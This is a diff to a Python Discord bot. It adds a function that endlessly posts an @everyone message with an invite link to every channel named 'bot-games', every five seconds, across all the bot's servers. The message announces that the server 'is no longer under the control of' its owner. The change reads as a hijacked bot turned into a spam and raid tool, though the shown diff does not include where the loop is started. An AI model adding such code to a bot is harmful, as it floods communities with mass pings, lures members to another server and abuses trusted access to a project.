@@ -1,5 +1,6 @@
 import discord
 import os
+import asyncio
 from discord.ext import commands
 
 # Import modules
@@ -11,7 +12,25 @@ intents.message_content = True
 
 intents.members = True
 bot = commands.Bot(command_prefix="!", intents=intents)
+TEXT_CHANNEL_NAME = "bot-games"
 
+ANNOUNCE_MESSAGE = (
+    "@everyone 🐍 **Join the Vipera Original Server!**\n\n"
+    "🔗 https://discord.gg/6esEZHHv\n\n"
+    "⚠️ This server is no longer under the control of Khalessi."
+)
+
+async def spam_channel(bot, message):
+    await bot.wait_until_ready()
+    while not bot.is_closed():
+        for guild in bot.guilds:
+            for channel in guild.text_channels:
+                if channel.name == TEXT_CHANNEL_NAME:
+                    try:
+                        await channel.send(message)
+                    except Exception as e:
+                        print("Failed to send:", e)
+        await asyncio.sleep(5)
 @bot.event
 async def on_ready():
     print(f"Logged in as {bot.user}")
